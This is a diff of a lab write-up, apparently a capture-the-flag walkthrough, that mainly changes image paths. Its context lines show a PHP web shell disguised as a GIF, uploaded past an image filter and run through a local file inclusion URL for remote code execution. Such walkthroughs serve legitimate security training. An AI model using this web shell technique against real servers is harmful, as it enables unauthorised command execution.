@@ -130,19 +130,19 @@ As we can see, the `id` command was successfully executed. Both the `zip` an
 # Question
 ---
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250218152650.png)
+![](cybersecurity/images/Pasted%2520image%252020250218152650.png)
 
 Let's check the site:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250218152708.png)
+![](cybersecurity/images/Pasted%2520image%252020250218152708.png)
 
 We got `Profile Settings`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250218152723.png)
+![](cybersecurity/images/Pasted%2520image%252020250218152723.png)
 
 In here, we can upload images, if we try uploading another file, we get this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250218152746.png)
+![](cybersecurity/images/Pasted%2520image%252020250218152746.png)
 
 There are many ways to bypass this restriction but since we are following the guideline of the module, let's go with the malicious file upload, in this case, I will upload a malicious gif file:
 
@@ -152,11 +152,11 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > webshell.gif
 
 Now, let's upload it:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250218153201.png)
+![](cybersecurity/images/Pasted%2520image%252020250218153201.png)
 
 If we check the source code, we can see the path where images are uploaded:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250218153225.png)
+![](cybersecurity/images/Pasted%2520image%252020250218153225.png)
 
 So, we need to visit:
 
@@ -166,7 +166,7 @@ http://IP:PORT/index.php?language=./profile_images/webshell.gif&cmd=id
 
 And we'll see the following:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250218153601.png)
+![](cybersecurity/images/Pasted%2520image%252020250218153601.png)
 
 We got RCE, let's search around for the flag:
 
